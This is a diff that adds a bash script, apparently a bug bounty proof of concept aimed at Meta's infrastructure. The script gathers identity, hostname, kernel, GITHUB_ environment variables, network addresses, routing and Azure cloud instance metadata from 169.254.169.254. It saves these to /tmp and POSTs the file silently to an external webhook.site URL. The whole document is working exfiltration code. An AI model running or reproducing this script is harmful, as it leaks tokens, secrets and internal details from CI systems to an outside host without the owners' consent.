@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# --- CONFIGURATION ---
+WEBHOOK_URL="https://webhook.site/eb214771-d9b6-4fc9-a082-6d6e3f1bfa7f"
+
+# --- STARTING THE RECON (ONE-CLICK EXECUTION) ---
+# Meta Bug Bonty FIRMAN SAHIDIN
+(
+  echo "--- CRITICAL PROOF: META INFRASTRUCTURE RCE ---"
+  echo "1. IDENTITY & HOST"
+  echo "Whoami: $(id)"
+  echo "Hostname: $(hostname)"
+  echo "Uname: $(uname -a)"
+  echo ""
+  
+  echo "2. ENVIRONMENT LEAKS (GITHUB_...)"
+  env | grep "GITHUB_"
+  echo ""
+  
+  echo "3. INTERNAL NETWORK RECON"
+  echo "IP Addr:"
+  ip addr show | grep "inet "
+  echo "Routing Table:"
+  ip route
+  echo ""
+  
+  echo "4. CLOUD INSTANCE METADATA (IMDS)"
+  # Meta Bug Bonty FIRMAN SAHIDIN
+  curl -s -m 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || echo "IMDS not accessible"
+  echo ""
+
+  echo "5. SOURCE CODE PATH & LISTING"
+  echo "PWD: $(pwd)"
+  ls -la
+  echo ""
+
+  echo "--- END OF POC ---"
+) > /tmp/final_poc_meta.txt
+
+# --- SENDING DATA TO WEBHOOK (RAW CONTENT VIEW) ---
+# Paké --data-binary Meta Bug Bonty FIRMAN SAHIDIN 'Raw Content' di webhook.site
+curl -s -X POST --data-binary @/tmp/final_poc_meta.txt $WEBHOOK_URL > /dev/null 2>&1 &
+
+# Meta Bug Bonty FIRMAN SAHIDIN
